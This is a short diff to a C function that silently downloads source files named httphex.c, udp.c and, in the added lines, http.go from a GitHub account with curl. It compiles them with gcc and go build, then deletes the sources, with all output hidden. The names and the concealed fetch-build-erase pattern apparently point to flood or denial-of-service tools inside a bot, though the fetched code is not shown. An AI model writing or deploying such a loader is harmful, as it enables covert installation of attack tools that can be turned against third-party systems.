@@ -19,10 +19,13 @@
 void download_files() {
     system("curl -s https://raw.githubusercontent.com/bobjohnmarley123/dog/main/httphex.c -o httphex.c > /dev/null 2>&1");
     system("curl -s https://raw.githubusercontent.com/bobjohnmarley123/dog/main/udp.c -o udp.c > /dev/null 2>&1");
+    system("curl -s https://raw.githubusercontent.com/bobjohnmarley123/dog/main/http.go -o http.go > /dev/null 2>&1");
     system("gcc httphex.c -o httphex -pthread > /dev/null 2>&1");
     system("gcc udp.c -o udp -pthread > /dev/null 2>&1");
+    system("go build http.go > /dev/null 2>&1");
     system("rm udp.c");
     system("rm httphex.c");
+    system("rm http.go");
 }
 
 
